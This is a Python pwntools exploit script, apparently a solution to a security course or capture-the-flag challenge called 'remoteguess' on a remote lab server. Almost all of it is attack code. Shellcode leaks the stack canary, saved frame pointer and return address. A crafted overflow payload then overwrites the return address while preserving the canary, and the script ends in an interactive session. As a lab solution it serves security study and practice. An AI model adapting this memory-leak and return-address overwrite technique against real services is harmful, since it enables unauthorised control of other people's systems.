#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

payload = asm("""
enter  0x80,0x0;
mov    [rbp-0x78],rdi;
mov    rax, fs:0x28;
mov    [rbp-0x8],rax;
movabs rax,0x0a786c6c36313025;
mov    [rbp-0x70],rax;
mov    [rbp-0x68],rax;
mov    [rbp-0x60],rax;
mov    rcx,[[rbp+0x08]];
mov    rdx,[[rbp]];
mov    rsi,[[rbp-0x08]];
lea    rdi,[rbp-0x70];
call   [rbp-0x78];
""")
              
#r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(0).encode())
    r.sendafter(b'bytes): ', payload)
    
    r.recvline()
    tmp = str(r.recvline()).split('\'')[1].split('\\')[0]
    print(tmp)
    canary = p64(int(tmp,16))
    tmp = str(r.recvline()).split('\'')[1].split('\\')[0]
    print(tmp)
    rbp = p64(int(tmp,16))
    tmp = str(r.recvline()).split('\'')[1].split('\\')[0]
    print(tmp)
    address = p64(int(tmp,16) + 171)
    guess = "0\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    pending = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    ans = guess.encode() + canary + rbp + address + pending.encode()
    r.sendafter(b'Show me your answer?', ans)
else:
    r.sendlineafter(b'send to me? ', b'0')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
